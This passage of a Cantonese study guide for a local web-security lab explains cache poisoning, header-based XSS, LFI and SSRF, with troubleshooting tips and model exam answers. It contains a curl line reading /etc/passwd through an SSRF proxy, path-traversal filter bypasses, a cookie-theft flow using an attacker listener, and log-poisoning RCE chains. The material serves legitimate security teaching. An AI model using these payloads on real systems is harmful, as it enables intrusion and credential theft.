| 雲 metadata（lab 模擬） | `http://localhost:8080/metadata.php?path=latest/meta-data/iam/security-credentials/LabInstanceRole` |
| 內部 API secrets | `http://localhost:8080/internal/api.php?endpoint=secrets` |
| 內部 service accounts | `http://localhost:8080/internal/api.php?endpoint=users` |
| PDF report generator | `http://localhost:8080/pdf.php` |
| image proxy 讀本地檔 | `curl "http://localhost:8080/imgproxy.php?url=file:///etc/passwd"` |
| 真實雲 metadata（對照） | `http://169.254.169.254/latest/meta-data/` |
| GCP metadata（對照） | `http://metadata.google.internal/` |

### 5.5 四節共通：成功／失敗快速判別表

零經驗最常卡住嘅唔係「唔識做」，而係「做咗但唔知係成功定失敗」。下表把四節嘅判別標準一次列清：

| 節 | 成功嘅鐵證 | 似成功但其實失敗 | 即刻要做嘅檢查 |
|---|---|---|---|
| §5 Cache Poisoning | 全新 private window、冇帶 header，仍見到毒連結 | 只喺自己 Repeater／同一瀏覽器見到毒頁 | 先清 cache，再開 private window |
| §7 Reflected XSS | 瀏覽器**渲染**出紅框／`<mark>` 標記／被偷 cookie | 只喺 raw response 見到 payload 字串 | 確認未登入；payload 引號有冇截斷 |
| §10 LFI | response 頂部出現 `/etc/passwd` 或 config source | response 完全正常、冇任何檔案內容 | 加／減一組 `../` 試層數 |
| §14 SSRF | 收到伺服器 fetch 返嚟、你直接攞唔到嘅內部內容 | 你自己 listener 有 hit（只證明有 outbound） | 改打內部 API／metadata，確認讀到內部嘢 |

> ⚠️ 教材外補充：做 lab 之前，建議先喺紙上寫低「今次測試嘅成功標準係咩」，例如「private window 見到 `evil.example.com` 就當成功」。有咗客觀標準，就唔會被「似成功」嘅假象誤導。

---

## 🧩 6. 新手補充：零經驗專用講解

本節全部內容標 `> ⚠️ 教材外補充`，係為零實戰經驗嘅你補上原文冇明講嘅位。

### 6.1 §5 Cache Poisoning 新手拆解

> ⚠️ 教材外補充：**為何會有呢個漏洞（日常比喻）。** 想像一間便利店，雪櫃貼紙只寫「A 牌子可樂」。有個客人入嚟同店員講「我要一罐 A 牌子，但貼 B 牌子嘅標籤」。店員照做，之後所有買「A 牌子」嘅客人都攞到一罐貼咗 B 標籤嘅可樂——因為雪櫃認嘅係「A 牌子」呢個 key，完全冇理客人講嘅標籤要求。呢度「A 牌子」= cache key（`md5(REQUEST_URI)`），「客人講嘅標籤」= unkeyed input（`X-Forwarded-Host`）。漏洞唔係雪櫃壞，而係**cache 認貨用嘅 key 漏咗一個會改變貨品嘅因素**。

> ⚠️ 教材外補充：**瀏覽器同伺服器之間實際發生咩事。** 你喺 Burp Repeater 加咗 `X-Forwarded-Host: evil.example.com` 送出。request 去到伺服器前面嘅 cache：cache 睇 cache key（淨係 URL `/contact.php`），發現冇存貨，於是放行畀後面嘅應用。應用生成 HTML 時，`get_base_url()` 讀你嘅 header，把「Return to home」連結嘅 hostname 寫成 `evil.example.com`。應用回一份有毒 HTML，cache 見 cache key 係 `/contact.php`，就**照存**呢份毒 HTML。下一個冇帶 header 嘅訪客問 `/contact.php`，cache 見 key 一樣，直接派毒 HTML 出去——應用完全冇再參與。

> ⚠️ 教材外補充：**新手最常撞嘅 5 個卡點。**
> 1. **冇清 cache 就試**：舊 entry 已存在時，你嘅 request 唔會覆蓋佢。永遠先 `http://localhost:8080/clear_cache.php`。
> 2. **用同一瀏覽器結果係「假成功」**：如果 Firefox 自己 cache 咗頁面，你會以為毒咗但其實係本地 cache。一定要開 **private window** 或清瀏覽器 cache。
> 3. **Burp 收唔到 request**：檢查 Firefox 有冇設 FoxyProxy 指向 Burp（`127.0.0.1:8080`），同埋 Burp 嘅 Proxy > Intercept 是否 on、target scope 是否包含 `localhost`。
> 4. **Cert 未 import**：如果行 HTTPS 而未裝 Burp CA，畫面會出安全警告。HTTP（`http://localhost:8080`）唔使裝，但若之後去 HTTPS 站，要喺 Firefox 匯入 PortSwigger CA。
> 5. **Header 名打錯**：`X-Forwarded-Host` 每個字都敏感，打錯（例如 `X_Fowarded_Host`）就冇反射。

> ⚠️ 教材外補充：**點判斷成功定失敗。** 成功嘅鐵證係「**全新 private window、冇帶 header、見到毒連結**」。若果：
> - canary 有反射但 private window 見唔到毒連結 → cache 未污染（可能冇清 cache，或 cache 唔 cache 呢條 URL）；
> - canary 完全冇反射 → header 唔係 unkeyed input（可能應用唔用呢個 header，或被 proxy 剝走）；
> - 有時得有時唔得 → 你可能改緊嘅係「唔同 URL 但同一 cache key」或者 cache 有 TTL 令毒 entry 過期。

### 6.2 §7 反射 XSS 新手拆解

> ⚠️ 教材外補充：**為何 header 唔會經過前端的 JS 檢查。** 呢個係新手最大嘅思想陷阱：好多新手以為「我個網站有前端表單驗證，所以安全」。但**前端驗證只係檢查表單欄位**，而且佢係喺**你嘅瀏覽器**入面行嘅 JS。攻擊者根本唔用你個網站嘅表單——佢係用 Burp 直接砌一條 HTTP request，喺 **header** 度落 payload。呢條 request 由 Burp ／攻擊者嘅工具直接送去伺服器，**完全跳過任何屬於你網站頁面嘅 JS**。前端驗證對「唔經表單」嘅攻擊等於零。

> ⚠️ 教材外補充：**為何 header 可以做攻擊向量（現實原因）。** 你可能問：「瀏覽器唔係唔畀我改 header 咩？」係，正常網頁嘅 JS **唔可以**設定任意 header（同源政策）。但攻擊者有好多條路照樣送到達：用 intercepting proxy（Burp／ZAP）、用反向代理把 header 蓋章加落 request、用瀏覽器 extension、或者即使冇得改 header，同一份反射邏輯往往亦存在喺一個**可反射嘅 URL 參數**度——兩者落點相同。所以「唔可以喺表單打」唔代表安全。

> ⚠️ 教材外補充：**為何 event handler 喺元素屬性入面會執行。** 當瀏覽器見到 `<img src=x onerror="...">`，佢把 `onerror="..."` 嘅內容當成**一段 JavaScript 字串**。當事件（load 失敗）觸發，瀏覽器就以**該頁面嘅 origin**去 eval 嗰段字串。origin 係網站自己嘅，所以嗰段 code 有網站 cookies、可以讀 `document.cookie`、可以發 `fetch` 去任意地方——即係「以網站身份行駛」。呢個就係為何單純 block `<script>` 冇用：`svg onload`、`img onerror`、`body onload` 等都係另一條執行路徑。

> ⚠️ 教材外補充：**偷 admin session 嘅正確用法（與 CWE-79 收尾）。** 本 lab 嘅反射喺未登入時先出現。真實攻擊流程係：攻擊者砌一條帶 payload header 嘅 request（或一條 reflectable URL），誘使**已登入嘅 admin** 觸發（例如用一個喺 admin 瀏覽器內自動發 request 嘅頁面），payload 以 admin 身份讀 `document.cookie`，再 `fetch` 去攻擊者 server。攻擊者攞到 `PHPSESSID` 後，喺自己瀏覽器設定同一個 cookie，就以 admin 身份登入。**防禦重點**：session cookie 加 `HttpOnly`（令 `document.cookie` 讀唔到）、加 `Secure`、實行 CSP。

> ⚠️ 教材外補充：**新手卡點同判別。**
> 1. **已登入時冇反射**：本 lab 反射只喺未登入出現；已登入會顯示你自己（正確轉義）嘅名。測試前先登出或開 private window。
> 2. **payload 引號衝突**：`onerror="..."` 用雙引號包住，入面就唔可以用未轉義嘅雙引號，要用單引號，否則你嘅 header 值會被截斷。
> 3. **`outerHTML` 換走咗成個元素**：payload 用 `this.outerHTML='...'` 係刻意嘅（proof），但會令元素消失，唔可以連續喺同一個元素做兩次。
> 4. **`nc` listener 收唔到**：確認 `192.168.56.1` 係你攻擊機嘅 host IP（`ip a`）、防火牆冇 block 8088、受害者（靶場 VM）路徑可達你嘅 IP。
> 5. **判別成功**：最可靠嘅係「執行證明」（紅框 / `<mark>` 標記）＋「外傳證明」（netcat 見到 request 或 lab marker 出現）。只喺 Repeater 見到 payload 字串**唔算**成功——要喺**瀏覽器渲染**先算。

### 6.3 §10 LFI 新手拆解

> ⚠️ 教材外補充：**日常比喻。** 圖書館只准你由「語言架」攞書，個指示牌係「由語言架行 N 步，攞你講嘅書名」。你話「行上一層、再上一層……攞 `etc/passwd`」，職員照做，因為佢淨係識拼接你講嘅路徑，冇檢查你會唔會行出語言架。`../` = 「上一層」。

> ⚠️ 教材外補充：**`../` 點計數。** 由 web root（例如 `/var/www/html/`）出發，`include("lang/" . $lang)` 會變成 `/var/www/html/lang/../../../../../../etc/passwd`。每一組 `../` 退一層目錄。`lang/` 本身佔一層，之後每組 `../` 再退一層。要爬到 `/` 再入 `etc/passwd`，通常要 6 到 7 組 `../`（原文用咗 6 組）。路徑遍歷唔一定需要「足夠多」——只要有**至少**足夠嘅數目就到頂，多出嘅 `../` 到 root 之後會被系統忽略（`/..` = `/`）。

> ⚠️ 教材外補充：**為何 `include` 令 LFI 更危險。** `include` 唔係影印，係**執行**。如果被 include 嘅檔係 PHP，入面任何 `<?php ... ?>` 都會行。所以攻擊者只要搵到「任何一個自己寫得到、又能被 include 到」嘅地方（上傳嘅檔、PHP session 檔、被寫入咗 payload 嘅 web server log），就可以把 LFI 升級成 RCE。呢個「升級鏈」係 LFI 最核心嘅考試點。

> ⚠️ 教材外補充：**攻擊者常用嘅繞過技巧（原文題目點名）。**
> - **編碼繞過**：`..%2f`（URL encode `/`）、`%2e%2e%2f`（編碼 `.` 同 `/`）、雙重編碼 `%252e%252e%252f`——繞過只 filter 字面 `../` 嘅過濾器。
> - **大小寫／特殊寫法**：Windows 上 `..\` 用反斜線；空字節繞過舊 PHP `%00`（截斷副檔名）。
> - **雙重（nested）遍歷**：filter 只 replace 一次 `../` 時，送 `....//` 令過濾後變返 `../`。
> - **絕對路徑**：直接送 `/etc/passwd`（若 filter 只擋 `../` 但唔擋絕對路徑）。
> - **為何 `/etc/passwd` 係經典 PoC**：佢喺幾乎每部 Linux 都存在、可讀、內容格式一眼認得出（`root:x:0:0:...`），而且**零副作用**——讀佢唔會改動系統，係最安全嘅「我讀到檔」證明。

> ⚠️ 教材外補充：**新手卡點。**
> 1. **數唔清 `../` 層數**：唔知 web root 喺邊就估唔到要幾多層。實務上可以試由 3 層試到 10 層，睇邊個 response 出內容。
> 2. **內容出現喺頁頂唔係 bug**：include 喺頁面組裝時行，所以檔案內容會喺 HTML header 之前印出，正常。
> 3. **只想睇 source 唔想執行**：如果 include 會執行程式碼，你想睇 source 就可以用 PHP 包裝（例如 `php://filter/convert.base64-encode/resource=index.php`）——但注意本 lab 嘅 `include("lang/".$lang)` 有前綴，要配合 `../` 先用到。呢啲屬進階，原文只提及，唔係本 lab 主線。
> 4. **`config.php.bak` 係副檔名 `.bak`**：`include` 對 `.bak` 檔會當純文字 print（PHP 只對 `.php` 等先執行，除非 URL 用 `?>` 技巧），所以你能見到 source。
> 5. **判別成功**：response 頂部出現 `/etc/passwd` 內容或 config source = 成功；若 response 完全正常、冇任何檔案內容 = 路徑層數唔啱或者參數唔係拼接落路徑。

### 6.4 §14 SSRF 新手拆解

> ⚠️ 教材外補充：**日常比喻。** 你係一個外賣員，唔准入大廈。但大廈大堂有個「代客取件」職員，你只要寫張紙「幫我去 3 樓 302 室攞份文件」，職員有通行證、行入去幫你攞，再交返畀你。SSRF 就係：**你利用有權限嘅伺服器，去到你原本到唔到嘅地方。** 伺服器係「大堂職員」，雲 metadata／內部 API 係「3 樓 302 室」。

> ⚠️ 教材外補充：**點解 `169.254.169.254` 咁值錢。** 呢個係雲 VM 內部嘅 metadata 位址（link-local），通常只有 VM 自己（同同一網段）到得到。攻擊者由互聯網永遠打唔到佢，但**透過 SSRF，伺服器代打**就到。佢會回傳：實例身份（instance identity）、IAM role 名同**臨時憑證（temporary credentials）**、以及 user-data 啟動腳本（好多時入面 hard-code 咗 key）。攻擊者攞到臨時憑證後，就可以用 AWS CLI／API 由外部以該 role 嘅權限操作雲資源——即由「一個 web 漏洞」跳去「雲帳號接管」。

> ⚠️ 教材外補充：**`file://` wrapper 點解可以讀檔。** PHP 嘅 `file_get_contents()` 睇嘅係你畀嘅 URL scheme。畀 `http://` 佢就開網絡連線；畀 `file://` 佢就**由本地檔案系統讀檔**。所以一條設計成「fetch 遠端圖片」嘅 image proxy，只要冇封鎖 `file://`，就可以被當成「任意檔案讀取器」。本 lab 用 `curl "http://localhost:8080/imgproxy.php?url=file:///etc/passwd"` 示範。

> ⚠️ 教材外補充：**新手卡點。**
> 1. **`file://` 相對／絕對路徑寫錯**：三個斜線 `file:///etc/passwd`（`file://` + 絕對路徑 `/etc/passwd`）；寫成 `file://etc/passwd` 會唔同。
> 2. **`@` 符號誤解**：`@file_get_contents()` 前面個 `@` **只係收埋 warning，唔係安全措施**。新手常誤以為佢係防護。
> 3. **用 curl 唔用瀏覽器**：image proxy 回傳 image content type，瀏覽器會試住 render 佢、可能睇唔到 raw bytes。用 `curl` 先睇得到內容。
> 4. **localhost 同 127.0.0.1 未必一樣**：有啲環境 `localhost` 解析去 `::1`（IPv6），同 `127.0.0.1`（IPv4）唔同；兩者都要試。
> 5. **判別成功**：SSRF 成功 = 你收到由伺服器 fetch 返嚟、你原本直接攞唔到嘅內容（內部 API JSON、metadata 憑證、`/etc/passwd`）。若只係你自己嘅外部 listener 有 hit，只證明「有 outbound」，未證明「讀到內部嘢」。

---

## 💬 7. Student questions 詳解

> 本節把本檔四個 section 嘅原文題目（英文原樣 ＋ 原題號）全部列出。每題下面嘅建議答案全部標 `> ⚠️ 教材外補充（答案）：`，因原文 PDF 只有題目、答案冇 render。共 **15 條**。

### 7.1 §5 Web Cache Poisoning（原題 1–4，原文 p.73）

**Q1.** *For web cache poisoning to be possible, a request input must have a specific relationship to the cache key. Define "unkeyed input" and explain which common proxy-related headers exhibit this property.*

> ⚠️ 教材外補充（答案）：**English key points** — An unkeyed input is a request input that changes the response but is not part of the cache key, so the cache may store that response under a URL other visitors will request. Common proxy-related headers that behave this way include `X-Forwarded-Host`, `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`, and `X-Host`. **繁中拆解** — Cache key 係 cache 判斷「兩條 request 應否收同一存貨」嘅依據；只要一個輸入有改到 response 但**冇**入 cache key，佢就係 unkeyed input，cache 就會用「相同 key」存起一份受該輸入影響嘅 response。呢啲 header 之所以特別危險，係因為應用常信任 reverse proxy 加入嘅 forwarding header 嚟砌絕對 URL。**考官要聽嘅 point**：定義 + 至少舉 2–3 個 header 名 + 「response 因佢改變但 cache key 唔含佢」。**常見錯答**：只講「header 可以被改」，冇講佢同 cache key 嘅關係（漏咗 unkeyed 嘅核心）。

**Q2.** *Explain the lookup behaviour of a shared cache that makes a poisoning attempt fail when a fresh entry already exists, and why an attacker must clear (or wait out) the cached response before planting a poisoned one.*

> ⚠️ 教材外補充（答案）：**English key points** — A shared cache serves any stored entry whose cache key matches the incoming request; if a fresh (non-expired) entry already exists, the cache returns it and never forwards the request to the application, so the attacker's malicious response is never generated or stored. The attacker must therefore clear the cache (via `clear_cache.php` in this lab) or wait for the entry to expire before the poisoned request can be stored. **繁中拆解** — Cache 命中（cache hit）時，request 根本唔會去到應用，所以攻擊者嘅毒 response 冇機會生成、更冇機會被儲存。要先清 cache（或等 TTL 過）令 cache miss，惡意 request 先會到達應用並被存起。**常見錯答**：以為「再送一次就會覆蓋」——實際上 cache hit 時唔會覆蓋。

**Q3.** *An application builds a `<script>` URL from an unkeyed header and the page is served from a shared cache. Describe the full impact on every later visitor and name the attack classes this enables.*

> ⚠️ 教材外補充（答案）：**English key points** — Every later visitor whose request shares the cache key receives the poisoned page containing an attacker-controlled script URL, so their browsers load and execute the attacker's JavaScript in the site's origin. This enables reflected/stored XSS, open redirects, malicious JavaScript imports, and phishing; the impact is multiplicative because one malicious request poisons an entry served to thousands of visitors. **繁中拆解** — script URL 由 unkeyed header 砌出 → 毒 response 被 cache 存起 → 之後每個命中該 key 嘅訪客都收到指向攻擊者 script 嘅頁面，瀏覽器以網站 origin 執行。影響係「乘數級」：一條 request 影響大量用戶。**考官要聽**：cross-user impact（唔止自己）+ 至少列 3 個 attack class（XSS、open redirect、malicious script import、phishing）。**常見錯答**：只講「自己見到毒頁面」，忽略「其他訪客都被影響」呢個核心。

**Q4.** *What is a canary value in web testing, and how does it prove that a header is an unkeyed input reflected into a cached response? State the exact evidence that distinguishes an unkeyed input from one included in the cache key.*

> ⚠️ 教材外補充（答案）：**English key points** — A canary is a unique, attacker-controlled marker string (e.g. `hkiitcanary1234`) sent as an input so the tester can search for it in the response. If the canary appears in the response body while the request URL stays the same, the header is reflected and therefore unkeyed. The exact distinguishing evidence: change the header value while keeping the URL identical — if the response body changes, the input is unkeyed; if the response is unchanged despite different header values, the input is part of (keyed into) the cache key. **繁中拆解** — Canary 係一個你獨有嘅字串；送出後喺 response 搜尋。**判別鐵證**：URL 不變、只改 header，若 response body 隨之改變 → unkeyed；若 response 完全不變 → 該輸入已經喺 cache key 內（keyed）。**常見錯答**：以為「見到 canary 就證明係 unkeyed」——其實見到 canary 只證明「有反射」，要**同時確認 URL 相同而 body 隨 header 變**先證明 unkeyed。

### 7.2 §7 Reflected XSS via HTTP Header（原題 1–4，原文 p.95–96）

**Q1.** *Reflected XSS is not limited to URL parameters. Explain why any attacker-controlled input that reaches the page unencoded — including HTTP request headers — can become an injection vector, and which application behaviour makes header-based reflection exploitable.*

> ⚠️ 教材外補充（答案）：**English key points** — XSS depends on unencoded data reaching the HTML, not on where the data came from; any input the attacker can control and that the server echoes into the page without encoding is an injection vector. Header-based reflection is exploitable when the application reads a request header (e.g. `X-Username` → `$_SERVER['HTTP_X_USERNAME']`) and prints it into the page with no encoding. Browsers block page JavaScript from setting arbitrary headers, but proxies, extensions, developer tools, and tools such as Burp/ZAP can still deliver the header, so the input is attacker-controllable. **繁中拆解** — 漏洞本質係「未編碼資料到達 HTML」，同「嚟自表單定 header」無關。應用把 header 值（PHP 映射成 `$_SERVER['HTTP_X_USERNAME']`）原封不動 echo 入頁面，就中招。雖然瀏覽器 JS 唔可以設定任意 header，但 proxy／extension／Burp 照樣送得到。**常見錯答**：認為「瀏覽器唔畀改 header，所以 header XSS 唔可能」——忽略了中介工具同反向代理呢條送達路徑。

**Q2.** *Explain the browser behaviour that makes `<img src=x onerror=...>` an XSS vector even where `<script>` is filtered: which event fires, and why does JavaScript in an event-handler attribute execute in the page's origin?*

> ⚠️ 教材外補充（答案）：**English key points** — The browser tries to load the image `x`, fails, and fires the `onerror` event; the JavaScript inside the `onerror` attribute runs in the context/origin of the page that contains the tag. Event-handler attribute content is executed as script by the browser, so filtering `<script>` tags does not prevent execution via other tags' handlers. **繁中拆解** — 因為圖片 `src=x` 載入失敗，觸發 **`onerror`** 事件；`onerror` 屬性內嘅字串被瀏覽器當成 JavaScript 執行，而且係以**該頁面嘅 origin**執行（即擁有網站 cookies 同權限）。所以 block `<script>` 攔唔到。**常見錯答**：只講「因為 onerror 係 JavaScript」而冇講「喺頁面 origin／上下文執行」呢個關鍵。

**Q3.** *Why does simply blocking `<script>` tags fail to stop XSS? Name at least three distinct execution vectors an attacker can rotate through when one is filtered, and explain why each fires.*

> ⚠️ 教材外補充（答案）：**English key points** — Blocking only `<script>` ignores that JavaScript can run from many HTML constructs. At least three vectors: (1) `<img src=x onerror=...>` — fails to load and fires `onerror`; (2) `<svg onload=...>` — the SVG element loads and fires `onload`; (3) `<body onload=...>` or other element load/error handlers (e.g. `<input autofocus onfocus=...>`) — the event fires when the element loads or gains focus. Each fires because the browser executes event-handler attribute content as script in the page origin. **繁中拆解** — 執行 JavaScript 嘅途徑唔止 `script` tag：`img` 嘅 `onerror`（載入失敗觸發）、`svg` 嘅 `onload`（元素載入完成觸發）、`body onload`／`input autofocus onfocus` 等事件處理器。每個都會被瀏覽器以頁面 origin 執行。**考官要聽**：至少三個 vector + 各自觸發原因。**常見錯答**：只舉一個 vector，或者講唔清每個事件幾時 fire。

**Q4.** *Context-aware output encoding is the primary XSS defense. Explain the mechanism by which encoding neutralizes markup injection, and why the encoding must match the output context (element content, attribute, JavaScript, URL).*

> ⚠️ 教材外補充（答案）：**English key points** — Output encoding replaces characters that are significant to the surrounding parser with safe entities, so the browser treats them as data rather than markup (e.g. `<` becomes `&lt;` in HTML context). The correct encoding depends on context because different parsers have different metacharacters: HTML element content vs attribute values, JavaScript string literals (where `'`/`"`/`\` matter), and URL contexts (where percent-encoding applies). Encoding for the wrong context leaves the metacharacters that the actual parser cares about unescaped. **繁中拆解** — 編碼把「對當前 parser 有特殊意思嘅字元」轉成安全實體（HTML 內 `<` → `&lt;`），令瀏覽器當佢係資料唔係標籤。**要 match context** 係因為唔同 parser 嘅特殊字元唔同：元素內容 vs 屬性值、JavaScript 字串（`'`、`"`、`\`）、URL（percent-encoding）。用錯 context 嘅編碼 = 漏咗真正該 escape 嘅字元。**常見錯答**：以為「一律 HTML encode 就安全」——喺 JavaScript 或 URL 上下文，HTML encode 未必足夠。

### 7.3 §10 LFI via Language Loader（原題 1–3，原文 p.118–119）

**Q1.** *Explain the mechanics of path traversal through a dynamic file-inclusion parameter: why `../` sequences escape the intended directory, which filter-evasion tricks (encoding, case, double traversal) appear in practice, and why `/etc/passwd` is the canonical Linux proof-of-concept target.*

> ⚠️ 教材外補充（答案）：**English key points** — The application concatenates user input into a file path; `../` is the parent-directory component, so each sequence moves the resolved path one level up, letting the attacker climb out of the intended directory (e.g. `lang/`). Filter-evasion tricks include URL encoding (`..%2f`, `%2e%2e%2f`, double-encoding `%252e%252e%252f`), case/backslash variants on Windows (`..\`), and nested traversal where a single-pass filter that strips `../` can be bypassed with `....//`. `/etc/passwd` is canonical because it exists on almost every Linux host, is world-readable, has a recognisable format, and reading it is side-effect-free. **繁中拆解** — `../` 係「上一層目錄」組件，每組退一層，所以能爬出 `lang/`。繞過技巧：URL 編碼（`..%2f`、雙重編碼）、大小寫／反斜線變體、以及 `....//`（過濾一次後還原成 `../`）。`/etc/passwd` 之所以經典：幾乎每部 Linux 都有、可讀、格式易認、零副作用。**常見錯答**：只講 `../` 而舉唔出任何繞過技巧。

**Q2.** *In input validation generally, why does allow-listing beat deny-listing? Illustrate with at least one concrete deny-list bypass technique used against path-traversal or file-inclusion filters.*

> ⚠️ 教材外補充（答案）：**English key points** — An allow-list enumerates the only accepted values (here: `en`, `zh`, `zht`), so anything else is rejected by default; a deny-list enumerates known-bad patterns and therefore fails whenever a new or unanticipated encoding bypass appears. Concrete bypass: a filter that blocks the literal string `../` can be defeated with `..%2f` (or `%2e%2e%2f`, or double-encoded `%252e%252e%252f`) when the filter runs before URL-decoding. **繁中拆解** — Allow-list 只准已知好嘅值（唯有 `en`／`zh`／`zht`），其餘一律拒絕——「預設拒絕」係關鍵。Deny-list 只擋已知壞 pattern，一有新編碼變體就穿。具體繞過：過濾器只擋字面 `../`，但若過濾發生喺 URL-decode 之前，送 `..%2f` 或雙重編碼 `%252e%252e%252f` 就可繞過。**常見錯答**：只講「allow-list 安全啲」但舉唔出任何 deny-list 繞過實例。

**Q3.** *Why does a dynamic inclusion sink such as PHP's `include` turn LFI from information disclosure into remote code execution? Explain the escalation chain through attacker-writable file content (uploads, session files, poisoned logs).*

> ⚠️ 教材外補充（答案）：**English key points** — `include` does not just read a file — it parses and executes PHP code inside it. So if the attacker can place PHP code into any file on the filesystem that the `include` can reach, that code executes on the server: (1) upload a file (e.g. an avatar or document) containing `<?php ... ?>`; (2) write PHP into a PHP session file created by the app; (3) poison a web-server log by sending a request whose User-Agent contains PHP code, then include the log file. Any of these turns LFI into RCE. **繁中拆解** — `include` 會**執行** PHP 檔內容，唔止讀。攻擊者只要喺檔案系統任何能被 include 到嘅檔寫入 PHP code，就會被執行。三條升級鏈：(1) 上傳含 `<?php ?` 嘅檔；(2) 令應用生成嘅 PHP session 檔含 payload（例如把 payload 放入會存 session 嘅欄位）；(3) log poisoning——送一個 User-Agent 含 PHP code 嘅 request 寫入 web server log，再 include 個 log。**常見錯答**：以為 LFI「最多讀到檔」，忽略 include 嘅執行特性同升級到 RCE 嘅可能。

### 7.4 §14 SSRF（原題 1–4，原文 p.154）

**Q1.** *Why does SSRF defeat network-level perimeter defenses? Explain the trust internal services place in requests originating from the application server, and why that trust is dangerous.*

> ⚠️ 教材外補充（答案）：**English key points** — Perimeter defences assume that traffic crossing the boundary is untrusted and that anything inside is trusted; the application server sits inside the trusted segment and can reach internal services, cloud metadata, and localhost admin panels. When the server fetches an attacker-supplied URL, the request originates from a trusted host, so internal services apply no external authentication and treat it as legitimate. The SSRF therefore bypasses the perimeter entirely — the firewall only ever sees the server talking to an internal address. **繁中拆解** — 邊界防禦假設「出面唔可信、入面可信」。應用伺服器坐喺可信網段，能觸及內部服務／metadata／localhost admin。伺服器代打時，request 源自可信主機，內部服務唔會要求外部認證、當佢係合法流量，所以 SSRF 直接繞過邊界——防火牆只見到「伺服器同內部位址傾偈」，完全正常。**常見錯答**：只講「SSRF 打內部」，冇講「因為伺服器被信任，內部服務唔驗證」呢個關鍵。

**Q2.** *Why is the cloud metadata endpoint (169.254.169.254) the highest-value SSRF target on a cloud host? Describe the classes of credentials it exposes and how an attacker pivots from them to broader cloud access.*

> ⚠️ 教材外補充（答案）：**English key points** — It is a link-local address reachable only from the VM, so it is not exposed to the internet; it returns instance identity, IAM role names, and temporary credentials (Access Key ID, Secret Access Key, session token) plus user-data scripts that often contain hard-coded keys. With the temporary credentials the attacker calls the cloud provider's API from outside, assuming the attached IAM role's permissions, and pivots to other resources (S3, EC2, Secrets Manager) — escalating from a single web bug to cloud account access. **繁中拆解** — `169.254.169.254` 係 link-local、只有 VM 到得到，對外唔開放；回傳實例身份、IAM role 名、臨時憑證（Access Key ID／Secret Access Key／session token）同常含 hard-code key 嘅 user-data。攞到臨時憑證後，攻擊者由外部用雲 API 以該 role 權限操作，再 pivot 去其他資源——由一個 web 漏洞升級成雲帳號存取。**常見錯答**：只講「有憑證」，講唔清係「臨時憑證」以及「由外部用 API 行使該 IAM role」嘅 pivot 步驟。

**Q3.** *Design a safe URL-fetching feature (link preview, webhook, import). Which layers of defense — scheme/domain allow-listing, private-IP and link-local blocking, DNS-rebinding awareness, network segmentation — are needed, and why is string-matching "localhost" insufficient?*

> ⚠️ 教材外補充（答案）：**English key points** — (1) Allow-list schemes (only `https`) and domains; (2) block private and link-local ranges including `169.254.169.254` and any redirect that resolves to them; (3) be aware of DNS rebinding — resolve the hostname, validate the resolved IP, and pin that IP for the actual fetch so the DNS answer cannot change between check and use; (4) route outbound fetches through a hardened proxy in an isolated network segment so metadata endpoints are unreachable; never follow redirects blindly. String-matching "localhost" is insufficient because the same address has countless equivalent forms — `127.0.0.1`, `127.1`, `0.0.0.0`, `[::1]`, decimal/octal encodings, and DNS names that resolve to `127.0.0.1` — so an attacker trivially bypasses a literal string filter. **繁中拆解** — 多層防禦：allow-list scheme（只 `https`）＋域名；封鎖私有同 link-local 範圍（含 `169.254.169.254`）同會 redirect 去呢啲位址嘅 URL；處理 DNS rebinding（解析後驗證 IP 並固定該 IP 去 fetch，避免「檢查同使用之間」DNS 答案改變）；outbound 經隔離網段嘅硬淨 proxy，令 metadata 端點不可達；唔好盲目跟 redirect。單靠比對 "localhost" 唔夠，因為同一位址有無數寫法（`127.0.0.1`、`127.1`、`0.0.0.0`、`[::1]`、十進位／八進位編碼、解析成 `127.0.0.1` 嘅域名）。**常見錯答**：只講「封鎖 localhost 同 127.0.0.1」，忽略 DNS rebinding、redirect、其他 IP 表示法同網絡隔離。

**Q4.** *Why do internal micro-services and admin APIs so often lack authentication, and how does that convert a single SSRF primitive into secret theft and lateral movement? Illustrate with the internal API example.*

> ⚠️ 教材外補充（答案）：**English key points** — Internal services are assumed reachable only from inside the trusted segment, so teams often omit authentication and rely on network position (security by network location); the admin/API endpoints therefore answer any caller from the server without credentials. A single SSRF primitive makes the server the caller, so the attacker reads those endpoints (in this lab, `/internal/api.php?endpoint=secrets` returns SMTP passwords, API gateway keys, VPN pre-shared keys, and database credentials; `?endpoint=users` lists service accounts with plaintext passwords and roles). Those secrets then let the attacker authenticate to other internal systems — lateral movement. **繁中拆解** — 內部服務假設「只有內部到得到」，所以慳得就慳、唔加認證，靠網絡位置做安全。SSRF 令伺服器成為 caller，於是攻擊者讀到呢啲無認證端點：本 lab `/internal/api.php?endpoint=secrets` 回傳 SMTP 密碼、API gateway key、VPN pre-shared key、資料庫憑證；`?endpoint=users` 列出 service accounts 連明文密碼同角色。攞到呢啲 secrets 就可以認證去其他內部系統——即橫向移動。**常見錯答**：只講「讀到 secrets」，冇連去「因為內部服務無認證」同「用 secrets 去 pivot（lateral movement）」兩點。

---

## 🎒 8. 考前 5 分鐘懶人包 ＋ 自測

### 8.1 關鍵數字／事實

- §5 cache key = `md5($_SERVER['REQUEST_URI'])`；header = `X-Forwarded-Host`；canary = `hkiitcanary1234`；毒 host = `evil.example.com`；OWASP **A05:2021**（Security Misconfiguration）。
- §5 研究：James Kettle 2018「Practical Web Cache Poisoning」＋ 2020「Web Cache Entanglement」。
- §7 header = `X-Username` → `$_SERVER['HTTP_X_USERNAME']`；CWE-**79**；OWASP **A03:2021**；三種 XSS：reflected／stored／DOM-based；candidate headers：`User-Agent`、`Referer`、`X-Forwarded-For`、`Cookie`；custom wordlist：`X-Username`、`X-User`、`X-User-ID`、`X-Forwarded-User`；工具：Param Miner；listener port 8088。
- §10 參數 `?lang=`；語言檔 `lang/en`、`lang/zh`、`lang/zht`；loader `includes/language.php`；path = `ROOT_DIR . '/lang/' . $_GET['lang']`；CWE-**22**；OWASP **A01:2021**；poison paths：`php://filter`、`phar://`；PoC 檔 `/etc/passwd`；backup `/backup/config.php.bak`。
- §14 功能：`/services.php`（Page Preview）、`/pdf.php`（Report Export）、`/imgproxy.php`（image proxy）；參數名 `?url=`、`?page=`、`?preview=`、`?feed=`、`?target=`、`?callback=`；CWE-**918**；OWASP **A10:2021**；metadata `169.254.169.254`；GCP `metadata.google.internal`；loopback 服務 Redis `6379`、Elasticsearch `9200`。

### 8.1b 四節核心病因對照（記住「同一條病因線」）

| 節 | 用戶可控輸入 | 程式點樣誤用佢 | 冇做嘅驗證 |
|---|---|---|---|
